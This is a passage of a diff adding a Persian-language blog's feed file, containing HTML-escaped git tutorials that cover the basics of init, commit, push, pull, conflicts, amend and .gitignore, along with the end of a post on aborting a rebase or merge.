+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;اگر در حین rebase متوجه شدیم که دو شاخه‌ی اشتباه رو داریم با هم rebase می‌کنیم یا به هر دلیل دیگری از ادامه‌ی rebase منصرف شدیم میتونیم از دستور زیر استفاده کنیم:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git rebase &lt;span class=&quot;nt&quot;&gt;--abort&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;مشابه همین رو برای merge هم داریم.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git merge &lt;span class=&quot;nt&quot;&gt;--abort&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ادامهی-مطالب&quot;&gt;ادامه‌ی مطالب&lt;/h3&gt;
+&lt;p&gt;گیت ابزار خیلی گسترده و گاهی پیچیده‌ای هست. استفاده ازش سرعت کار رو خیلی بالا می‌بره و وجود تاریخچه‌ی دقیق کد توی دیباگ کردن و مقایسه‌ی کد و خیلی کارهای جانبی دیگه مفیده، تا حدی که بعضی کارها رو بدون یک ورژن کنترل خوب (مثل گیت) نمی‌شه انجام داد. طبق تجربه، با توجه سرعتی که گیت نسبت به روش‌های سنتی ترکیب کد مثل استفاده از ایمیل و فلش و pastebin و… و مرج دستی کد به کار می‌ده به علاوه کم کردن احتمال خطای انسانی و حذف و اضافه شدن اشتباه کد؛ کاملا به صرفه‌ست که توی یک تیم (که باید به سرعت به یک محصول برسند) قبل از شروع کد زنی وقتی برای یاد گیری گیت گذاشته بشه. شخصاً منابع فارسی مناسبی برای گیت پیدا نکردم (البته یکی از دلایل اینه که کلا دنبال منابع فارسی نگشتم ‎:D) و روی تمام جزئیات git تسلط ندارم اما سعی می‌کنم که در حدی که توان دارم بر اساس خوانده‌ها و شنیده‌ها و تجربیات، راهنمای سریعی برای شروع کار با git بنویسم.&lt;/p&gt;
+
+&lt;p&gt;همچنین بخوانید:
+&lt;a href=&quot;/blog/2015/12/ssh-public-key-what-how-why/&quot;&gt;SSH Public key چیه؟ به چه دردی می‌خوره؟ چطوری بسازم؟&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://hive.ir/%D9%85%D8%B9%D8%B1%D9%81%DB%8C-%D8%B1%D9%88%D9%86%D8%AF%D9%87%D8%A7%DB%8C-%DA%A9%D8%A7%D8%B1-%D8%A8%D8%A7-git/&quot;&gt;معرفی روندهای کار با git&lt;/a&gt;&lt;/p&gt;</content><author><name>mashhadimj</name></author><summary type="html">این مطلب در ادامه‌ی چگونه از git استفاده کنیم نوشته شده. پیشنهاد می‌کنم قبل از مطالعه‌ی این مطلب به پست قبلی هم یک نگاه بندازید. در ادامه‌ی مطلب بر خلاف مطلب قبلی برای راحت تر شدن فهم موضوع فرض شده که از گیت برای مدیریت کد منبع یک نرم‌افزار استفاده می‌شه، هرچند بدیهتاً کاربرد گیت محدود به این موضوع نیست.</summary></entry><entry><title type="html">چگونه از git استفاده کنیم</title><link href="https://mjafar.me/blog/2015/08/how-to-use-git/" rel="alternate" type="text/html" title="چگونه از git استفاده کنیم" /><published>2015-08-04T14:14:16+00:00</published><updated>2015-08-04T14:14:16+00:00</updated><id>https://mjafar.me/blog/2015/08/how-to-use-git</id><content type="html" xml:base="https://mjafar.me/blog/2015/08/how-to-use-git/">&lt;h3 id=&quot;گیت-چیه&quot;&gt;گیت چیه؟&lt;/h3&gt;
+
+&lt;p&gt;گیت یک نرم‌افزار مدیریت نسخه است. تاریخچه و پدید آورندگانش به نظر من خیلی اهمیتی نداره ولی اگه کنجکاوید میتونید از &lt;a href=&quot;https://en.wikipedia.org/wiki/Git_(software)&quot; target=&quot;_blank&quot;&gt;ویکی‌پدیا&lt;/a&gt; بخونید. (گیت اسم یک روستا در خراسان جنوبی هم هست: &lt;a href=&quot;https://fa.wikipedia.org/wiki/%DA%AF%DB%8C%D8%AA_(%D8%B4%D9%87%D8%B1%D8%B3%D8%AA%D8%A7%D9%86_%D8%AF%D8%B1%D9%85%DB%8C%D8%A7%D9%86)&quot; target=&quot;_blank&quot;&gt;+&lt;/a&gt; :) )&lt;/p&gt;
+
+&lt;h3 id=&quot;مدیریت-نسخه-یعنی-چی&quot;&gt;مدیریت نسخه یعنی چی؟&lt;/h3&gt;
+&lt;p&gt;بله! گیت یک پوشه (که معمولا حاوی کد منبع یک نرم‌افزاره) رو تحت نظر می‌گیره و تمام تغییرات فایل‌های داخلش رو ثبت می‌کنه. بدون اینکه با کپی/پیست بخوایم از اون پوشه نسخه پشتیبان تهیه کنیم گیت تاریخچه‌ی تغییرات رو ذخیره می‌کنه. چون گیت فقط تغییرات رو ذخیره می‌کنه (و نه نسخه‌های مختلف پروژه در زمان‌های مختلف) حجم سرباری که به فایل‌ها اضافه می‌شه خیلی کم و معقوله. این تاریخچه خیلی خوب و کامل ذخیره می‌شه به طوری که بعداً میشه نسخه‌های قدیمی‌تر هر فایل رو دید، اونا رو با هم مقایسه کرد یا نسخه‌های قدیمی رو برگردوند. با گیت حتا میشه فهمید هر خط از فایل آخرین بار کی تغییر کرده و چه کسی تغییرش داده.&lt;/p&gt;
+
+&lt;h3 id=&quot;چه-جالب-دیگه-چه-کارهایی-میکنه&quot;&gt;چه جالب! دیگه چه کارهایی می‌کنه؟&lt;/h3&gt;
+&lt;p&gt;با گیت میشه به راحتی روی یک مجموعه فایل به صورت گروهی کار کرد. دیگه لازم نیست فایل‌ها رو روی دراپ‌باکس و paste bin و غیره بزارید یا برای هم با ایمیل بفرستید و تغییرات رو دستی با هم ترکیب کنید، گیت این کارو براتون انجام میده.&lt;/p&gt;
+
+&lt;p&gt;چون گیت بر اساس ذخیره کردن تغییرات کار می‌کنه (و نه کپی گرفتن از کل فایل‌ها) در جاهایی که حجم انتقال یا ذخیره سازی اطلاعات برامون هزینه بره می‌تونه کمک کنه. مثلا میشه یک وب‌سایت رو روی گیت قرار داد و وقتی خواستیم تغییری تو سایت ایجاد کنیم اون رو با گیت آپلود کنیم که بجای کل فایل‌های سایت فقط فایل‌هایی که تغییرکردن آپلود شن.&lt;/p&gt;
+
+&lt;h3 id=&quot;چطوری-نصب-میشه&quot;&gt;چطوری نصب میشه؟&lt;/h3&gt;
+&lt;p&gt;اگه از گنو/لینوکس استفاده می‌کنید احتمالا از قبل روی دستگاهتون نصب هست. با وارد کردن &lt;code class=&quot;highlighter-rouge&quot;&gt;git --version&lt;/code&gt; در ترمینال می‌تونید چک کنید که نصب شده یا نه. اگر نصب نشده بود بسته‌ی &lt;code class=&quot;highlighter-rouge&quot;&gt;git&lt;/code&gt; رو با package manager سیستم‌عاملتون نصب کنید (همون apt-get یا yum و pacman و…) .&lt;/p&gt;
+
+&lt;p&gt;اگر از ویندوز استفاده می‌کنید پیشنهاد من و ماکروسافت 
+&lt;a href=&quot;https://msysgit.github.io/&quot;&gt;Git for windows&lt;/a&gt;
+ هست. 
+ &lt;a href=&quot;http://sourceforge.net/projects/gitextensions/&quot;&gt;Git extensions&lt;/a&gt;
+  هم ابزار خوبیه که هم ویندوزی‌ها و هم گنو/لینوکسی ها هم میتونن ازش استفاده کنن و برای کار با گیت یک محیط گرافیکی فراهم می‌کنه.&lt;/p&gt;
+
+&lt;p&gt;گیت به طور کلی یک ابزار تحت خط فرمانه و دستوراتی که در ادامه معرفی می‌کنم رو باید داخل ترمینال (گنو/لینوکس و مک دارها) یا Git bash (ویندوزی‌ها) وارد کنید.&lt;/p&gt;
+
+&lt;h3 id=&quot;تنظیمات-اولیه&quot;&gt;تنظیمات اولیه&lt;/h3&gt;
+&lt;p&gt;گیت تنظیمات زیادی داره که در حالت عادی خیلی‌هاشون رو لازم نیست دست بزنیم. تنها چیزی که دفعه‌ی اول نصب مهمه اینه که خودمون رو به گیت معرفی کنیم! این مرحله برای انجام کار گروهی اهمیت بیشتری داره.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.name &lt;span class=&quot;s2&quot;&gt;&quot;Mohammad Jafar Mashhadi&quot;&lt;/span&gt;
+git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; user.email &lt;span class=&quot;s2&quot;&gt;&quot;me@mjafar.me&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;و اگه افرادی که روی فایل‌ها کار می‌کنن سیستم‌عامل‌های مختلفی دارن (که معمولا اینطور هست):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; core.autocrlf &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;علت نیاز به این دستور اینه که توی ویندوز آخر خط‌ها با دو نویسه‌ی ‎\r و ‎\n پشت سرهم مشخص میشه (CR LF) ولی تو سیستم‌عامل‌های دیگه فقط با یک ‎\n ‎  (LF). وقتی‌ به صورت گروهی روی یه سری فایل تغییر ایجاد می‌کنید آخر خط‌های این فایل‌ها بسته به سیستم‌عامل ممکنه CRLF یا LF باشن. ما برای اینکه به گیت بگیم بین LF و CRLF تفاوت قائل نشه و این مورد رو به عنوان «تغییر در محتوای فایل» در نظر نگیره باید این گزینه رو فعال کنیم.&lt;/p&gt;
+
+&lt;h3 id=&quot;از-کجا-شروع-کنیم&quot;&gt;از کجا شروع کنیم؟&lt;/h3&gt;
+&lt;p&gt;همونطور که گفتم گیت یک پوشه و فایل‌های داخلش رو تحت نظر می‌گیره، باید به git بگید که کدوم پوشه رو بررسی کنه. با cd وارد پوشه‌ای بشید که می‌خواید git روش نظارت کنه و دستور زیر رو وارد کنید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Create a git repository&lt;/span&gt;
+git init 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;فرقی نداره که پوشه خالی باشه یا از قبل حاوی تعدادی فایل باشه. از الان به بعد git حواسش به تغییرات فایل‌های این پوشه (از این به بعد بهش مخزن (repository) هم گفته می‌شه) هست. اگر ls –a وارد کنید میتونید پوشه‌ی مخفی‌ای به اسم ‎.git که تازه ساخته شده رو ببینید. داخل این پوشه اطلاعات مربوط به گیت نگه‌داری می‌شن. اگر پاکش کنید گیت دیگه کاری به اون پوشه نداره و مثه بقیه‌ی پوشه‌های عادی سیستم باهاش برخورد میشه.&lt;/p&gt;
+
+&lt;h3 id=&quot;بعد-چطور-طور-خاصی-باید-کد-بنویسم&quot;&gt;بعد چطور؟ طور خاصی باید کد بنویسم؟&lt;/h3&gt;
+&lt;p&gt;از الان میتونید تغییراتتون رو شروع کنید. فایل‌ها رو اضافه و حذف کنید و محتویاتشون رو عوض کنید. با وارد کردن دستور زیر گیت بهتون نشون می‌ده که چه فایل‌هایی تغییر کردن.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;بعد از اینکه کارتون تموم شد باید مجموعه تغییراتی که ایجاد کردید رو به عنوان یه نسخه ثبت (commit) کنید.
+برای کامیت باید اول به گیت بگید که کدوم فایل‌ها رو می‌خواید داخل کامیتتون داشته باشید. اول یک بار &lt;code class=&quot;highlighter-rouge&quot;&gt;git status&lt;/code&gt; بزنید تا یادتون بیاد چه فایل‌هایی تغییر کردند و بعد با &lt;code class=&quot;highlighter-rouge&quot;&gt;git add&lt;/code&gt; فایل‌ها رو به کامیت اضافه کنید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git add /path/to/file &lt;span class=&quot;c&quot;&gt;# Add one file to commit&lt;/span&gt;
+git add /a/directory/
+git add &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Add all modified and new files to commit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;برای اضافه کردن یک تک فایل از دستور اول استفاده کنید، اگر همه‌ی فایل‌های داخل یک پوشه رو میخواید اضافه کنید از دستور دوم و اگر همه‌ی فایل‌هایی که تغییر کردند رو می‌خواید وارد کامیت کنید از دستور سوم استفاده کنید.
+اگر فایلی رو حذف کردید و می‌خواید این عمل حذف وارد کامیت بشه بجای &lt;code class=&quot;highlighter-rouge&quot;&gt;git add&lt;/code&gt; از &lt;code class=&quot;highlighter-rouge&quot;&gt;git rm&lt;/code&gt; استفاده کنید.
+اگر فایلی رو اشتباهی به کامیت اضافه کردید از دستور زیر استفاده کنید تا از کامیت خارج شه:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git rm &lt;span class=&quot;nt&quot;&gt;--cached&lt;/span&gt; /path/to/file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;بعد از اینکه همه‌ی فایل‌ها رو اضافه کردید با دستور زیر کامیت رو تموم کنید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;توضیحات مربوط به این کامیت، چه چیزی رو اضافه کردید؟ چه چیزی رو اصلاح کردید؟ تو یه خط توضیح بدید&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;اگر توضیحاتتون توی یه خط جا نمی‌شه فقط بنویسید &lt;code class=&quot;highlighter-rouge&quot;&gt;git commit .&lt;/code&gt; یک ادیتور (معمولا vi) باز می‌شه که میتونید توضیحات چندخطی رو داخلش وارد کنید.&lt;/p&gt;
+
+&lt;p&gt;هر کامیت یه رشته‌ی یکتایی به اسم hash داره که به طور خودکار ساخته میشه و برای ارجاع دادن به اون کامیت استفاده میشه. معمولا ۷ حرف اول  hash هر کامیت برای ارجاع دادن کافیه.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2015/08/telegram-git-log.png&quot; alt=&quot;Git log on Telegram Android&quot; border=&quot;0&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;توی این شکل خروجی دستور &lt;code class=&quot;highlighter-rouge&quot;&gt;git log&lt;/code&gt; روی &lt;a href=&quot;https://github.com/drklo/telegram&quot; target=&quot;_blank&quot;&gt;سورس کد پیام رسان تلگرام&lt;/a&gt; رو می‌بینید. عبارت زرد رنگی که جلوی کلمه‌ی commit نوشته شده hash کامیت است. در ادامه مشخصات فرد کامیت کننده، تاریخ کامیت کردن و توضیح کامیت (commit message) رو می‌بینید.&lt;/p&gt;
+
+&lt;h3 id=&quot;چطوری-قراره-گروهی-کد-زدن-با-گیت-راحت-تر-بشه&quot;&gt;چطوری قراره گروهی کد زدن با گیت راحت تر بشه؟&lt;/h3&gt;
+&lt;p&gt;تا اینجا هر کاری که کردیم به صورت محلی روی رایانه‌ی خودمون ذخیره شد. می‌شه تا انتهای پروژه هم همین روند رو پیش گرفت و هیچ ارتباطی هم با اینترنت نداشت. تمام قابلیت‌های مدیریت نسخه‌ی گیت همچنان قابل دسترسن. ولی اگر قصد داشته باشیم که به صورت گروهی (دو نفر به بالا) روی یک مجموعه فایل کار کنیم باید کامیت‌هامون رو یک جای قابل دسترس برای هم‌گروهی‌هامون (مثلا سایت &lt;a href=&quot;http://github.com/&quot; target=&quot;_blank&quot;&gt;گیت‌هاب&lt;/a&gt;) قرار بدیم تا بتونن اونا رو دانلود کنن و روی فایل‌هاشون اعمال کنن. همچنین اونا هم کامیت‌هاشون رو از این طریق به ما بدن و در نهایت به یک مجموعه کد یکسان که حاصل ترکیب کامیت‌های همه‌ی اعضای گروهه برسیم.&lt;/p&gt;
+
+&lt;h3 id=&quot;فایلها-رو-باید-کجا-بزارم-که-برای-بقیهی-اعضای-پروژه-قابل-دسترس-باشه&quot;&gt;فایل‌ها رو باید کجا بزارم که برای بقیه‌ی اعضای پروژه قابل دسترس باشه؟&lt;/h3&gt;
+&lt;p&gt;سایت‌های github، gitlab و bitbucket رو پیشنهاد می‌کنم. اگر سرور شخصی دارید می‌تونید با یه مقدار تلاش و وقت گذاشتن روی سرور شخصیتون هم کار کنید. اگر می‌خواید کدها توسط عموم قابل دیدن نباشه باید از گیت‌لب یا بیت‌باکت استفاده کنید. روند اینطور هست که باید توی یکی از این سایت‌ها عضو شید و یک مخزن (repository) خالی درست کنید. بعد از ایجاد موفق یک مخزن خود این سایت‌ها بهتون دستورات لازم برای ارتباط پیدا کردن مخزن محلی و مخزن روی سرور (remote) رو نشون میدن. اصل کاری بین دستورات متعددی که توی سایت می‌بینید دو خطی هستن که شبیه این‌ها هستند:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git remote add origin ...
+git push origin master
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;خط اول مخزن روی سرور رو به مخزن محلی معرفی می‌کنه؛ آدرسش رو می‌ده و براش یه اسم میزاره (origin). خط دوم هم فایل‌ها رو روی مخزن remote ای به اسم origin آپلود می‌کنه. (بله، میشه یک مخزن محلی بیش از یک remote داشته باشه!)&lt;/p&gt;
+
+&lt;p class=&quot;r&quot; align=&quot;center&quot;&gt;&lt;img src=&quot;http://assets.dockstreetmedia.com/uploads/2012/10/git_bash_5-600x360.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;اگر صحنه‌ای شبیه عکس بالا دیدید یعنی push موفق بوده. برای مطمئن شدن می‌تونید دستور ‎&lt;code class=&quot;highlighter-rouge&quot;&gt;echo‎ ‎$?‎&lt;/code&gt; رو وارد کنید و اگر عدد 0 نوشته شد یعنی push موفق بوده. اگر پوش به ارور بخوره ممکنه مشکل از قطع بودن اینترنت باشه ولی مشکل (؟) معروف‌تری که معمولا با اون مواجه می‌شید ارور non fast-forward هست و عبارت fetch first در متن ارورها قابل مشاهده‌س. اگر به non fast-forward برخورد کردید نگران نباشید، معنیش اینه که افراد دیگه‌ای کامیت‌هاشون رو روی سرور push کردند و شما اون‌ها رو ندارید. همونطور که احتمالا حدس زدید باید کامیت‌های بقیه رو از سرور دریافت کنیم (fetch)، با کامیت‌های خودمون ترکیب کنیم(merge) و دوباره سعی کنیم push کنیم.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git fetch
+git merge
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;چون &lt;code class=&quot;highlighter-rouge&quot;&gt;fetch&lt;/code&gt; و &lt;code class=&quot;highlighter-rouge&quot;&gt;merge&lt;/code&gt; زیاد پشت سر هم استفاده می‌شن دستور دیگه‌ای تعبیه شده که کارش دقیقا ترکیب این دو تا دستوره. &lt;code class=&quot;highlighter-rouge&quot;&gt;git pull.&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;pull-کردم-و-به-conflict-خوردم-بعضی-از-فایلها-خراب-شدن-باید-چه-کنم&quot;&gt;pull کردم و به conflict خوردم، بعضی از فایل‌ها خراب شدن، باید چه کنم؟&lt;/h3&gt;
+&lt;p&gt;گیت تا جایی که ممکنه تغییرات همه رو با هم ترکیب می‌کنه اما یه جاهایی هست که چند نفر همزمان روی یک خط تغییر ایجاد کردن و گیت بین این تغییرات اولویتی قائل نیست. فکر کنم نیازی به توضیح نیست که چرا اولویت زمانی درست نیست (یعنی نمیشه کامیت جدیدتر رو به کامیت قدیمی‌تر ترجیح داد) به این شرایط می‌گن conflict و خروج از این شرایط باید به صورت دستی انجام شه. بعد از &lt;code class=&quot;highlighter-rouge&quot;&gt;merge&lt;/code&gt; با &lt;code class=&quot;highlighter-rouge&quot;&gt;git status&lt;/code&gt; می‌تونید چک کنید که آیا conflict به وجود اومده و اگر اومده کدوم فایل‌ها به conflict برخوردند. ابزارهایی مثل Meld یا git extensions برای رفع conflict وجود دارند. شخصا چون معمولا از IDE های &lt;a href=&quot;http://jetbrains.org&quot; target=&quot;_blank&quot;&gt;JetBrains&lt;/a&gt; استفاده می‌کنم از ابزار رفع کانفلیکت خود IDE استفاده می‌کنم و واقعا راضیم! بعد از رفع کانفلیکت باید فایل‌هایی که مشکل داشتن رو با git add علامت‌گذاری و کامیت کنید. کامیت‌های مربوط به رفع Conflict کامیت‌های خاصی هستن که لازم نیست براشون Commit message تعریف کنید، گیت به طور خودکار messageشون رو ایجاد می‌کنه.&lt;/p&gt;
+
+&lt;h3 id=&quot;خلاصهای-از-مراحل-آپلود-کامیتها&quot;&gt;خلاصه‌ای از مراحل آپلود کامیت‌ها&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;push&lt;/li&gt;
+  &lt;li&gt;اگر ارور نخورد -&amp;gt; پایان&lt;/li&gt;
+  &lt;li&gt;اگر ارور non fast-forward خورد: pull&lt;/li&gt;
+  &lt;li&gt;برو به 1&lt;/li&gt;
+  &lt;li&gt;پایان&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;سوالات-متدوال&quot;&gt;سوالات متدوال&lt;/h3&gt;
+&lt;h4 id=&quot;اگر-بخوایم-یه-کدی-رو-از-یه-مخزن-remote-مثلا-گیتهاب-دانلود-کنیم-و-روش-کار-کنیم-باید-چه-کار-کنیم-سعی-کردم-pull-و-fetch-کنم-ولی-نشد&quot;&gt;اگر بخوایم یه کدی رو از یه مخزن remote، مثلا گیت‌هاب، دانلود کنیم و روش کار کنیم باید چه کار کنیم؟ سعی کردم pull و fetch کنم ولی نشد!&lt;/h4&gt;
+
+&lt;p&gt;برای دانلود اولیه باید از دستور &lt;code class=&quot;highlighter-rouge&quot;&gt;clone&lt;/code&gt; استفاده کنید. مثلاً:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/MJafarMashhadi/AndroidDrawableFactory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;من-یه-کامیت-کردم-بعد-git-status-زدم-دیدم-یه-فایل-رو-جا-انداختم-چی-کار-کنم&quot;&gt;من یه کامیت کردم بعد &lt;code class=&quot;highlighter-rouge&quot;&gt;git status&lt;/code&gt; زدم دیدم یه فایل رو جا انداختم چی کار کنم؟&lt;/h4&gt;
+
+&lt;p&gt;اگر کامیت رو پوش کردید کاری نمیشه کرد. باید این فایل رو در یک کامیت جدا اضافه کنید وگرنه با آپشن ‎&lt;code class=&quot;highlighter-rouge&quot;&gt;--amend&lt;/code&gt; میشه یه فایل رو به آخرین کامیت اضافه کرد.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git add /path/to/the/forgotten/file
+git commit —-amend
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;من-یه-کامیت-کردم-بعد-متوجه-شدم-message-رو-اشتباه-نوشتم-میخوام-ویرایش-کنم-میشه&quot;&gt;من یه کامیت کردم، بعد متوجه شدم message رو اشتباه نوشتم، میخوام ویرایش کنم. میشه؟&lt;/h4&gt;
+&lt;p&gt;اگر هنوز push نکردید بله.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git commit &lt;span class=&quot;nt&quot;&gt;--amend&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;من-یه-کامیت-کردم-مسیجش-رو-عوض-کنم-ولی-کامیتش-خخیلی-قدیمیه-amend-فقط-رو-کامیت-آخر-کار-میکنه&quot;&gt;من یه کامیت کردم مسیجش رو عوض کنم ولی کامیتش خخیلی قدیمیه، ‎–amend‎ فقط رو کامیت آخر کار می‌کنه؟&lt;/h4&gt;
+
+&lt;p&gt;بله فقط رو کامیت آخر کار می‌کنه. کامیت‌هایی که رو سرور push شدن اصلا قابل تغییر نیستن ولی اگه هنوز پوش نشده ممکنه بشه یه کارایی کرد (مثلا با rebase). سرچ کنید&lt;/p&gt;
+
+&lt;p&gt;(ویرایش: درسته که کامیت‌های push شده رو نمی‌شه تغییر داد اما با rebase و force push می‌شه تاریخچه رو بازنویسی کرد و بعضی کامیت‌ها رو حذف/ویرایش کرد، صرفاً یه کمی بیشتر کار و دقت و سطح دسترسی لازم داره!)&lt;/p&gt;
+
+&lt;h4 id=&quot;من-یه-تعداد-فایل-و-پوشه-دارم-که-نمیخوام-git-اونا-رو-تحت-نظر-بگیره-چه-کار-کنم&quot;&gt;من یه تعداد فایل و پوشه دارم که نمی‌خوام git اونا رو تحت نظر بگیره. چه کار کنم؟&lt;/h4&gt;
+
+&lt;p&gt;فایل‌های کامپایل شده و فایل‌های مربوط به IDE نمونه‌های این فایل‌ها هستند. این‌ها اگه وارد git بشن با فایل‌های مشابه بقیه هم گروهی‌ها قاطی می‌شن و اون‌ها دیگه نمی‌تونن  پروژه رو باز کنن. یا مثلا آپلود فایل‌های کامپایل شده کار بیهوده‌ای هست چون از روی سورس‌ها قابل ساخته شدن هستند و حجم مخرن گیت رو بالا می‌برند.&lt;/p&gt;
+
+&lt;p&gt;باید فایلی بسازید به اسم &lt;code class=&quot;highlighter-rouge&quot;&gt;.gitignore&lt;/code&gt; توی این فایل اسم فایل و پوشه‌هایی که میخواید گیت تغییراتشون رو در نظر نگیره اضافه می‌کنین. مثلاً برای یک پروژه‌ی جاوا احتمالاً می‌نویسید:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*.class
+*.jar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;باید-gitignore-رو-دستی-درست-کنم-آمادهش-نیست&quot;&gt;باید gitignore رو دستی درست کنم؟ آماده‌ش نیست؟&lt;/h4&gt;
+
+&lt;p&gt;چرا هست! سایت &lt;a href=&quot;http://gitignore.io&quot;&gt;gitignore.io&lt;/a&gt; این کار رو می‌کنه. توش کلمات کلیدی پروژه (مثلا Python Django Pycharm) رو وارد کنید، یه git ignore کامل درست می‌کنه. منظور از کلمات کلیدی اسم IDE و زبان برنامه نویسی و اسم فریم ورک‌ها و…س.&lt;/p&gt;
+
+&lt;h4 id=&quot;گیت-فقط-برای-سورس-کد-و-کارهای-برنامه-نویسی-استفاده-میشه&quot;&gt;گیت فقط برای سورس کد و کار‌های برنامه نویسی استفاده می‌شه؟&lt;/h4&gt;
+
+&lt;p&gt;نه. همونطور که اول مطلب گفتم گیت هر نوع فایلی رو میتونه در نظر بگیره و اصلا وابسته به این نیست که فایل‌ها حاوی کد هستند یا چیز دیگه. میشه با گیت ویراست‌های یک کتاب رو ذخیره کرد (به خصوص اگر کتاب با TeX حروف‌چینی شده باشه)؛ میشه فایل‌های config یک سیستم رو با گیت ذخیره کرد و از تغییراتشون با خبر شد و اگر چیزی اشتباه config شده بود با یک خط دستور git به تنظیمات گذشته برگشت؛ میشه مستندات یک سیستم رو با گیت مدیریت کرد و خیلی کاربردهای دیگه.&lt;/p&gt;
+
+&lt;h4 id=&quot;باز-هم-ادامه-داره-من-هنوز-سوال-دارم&quot;&gt;باز هم ادامه داره؟ من هنوز سوال دارم!&lt;/h4&gt;
+
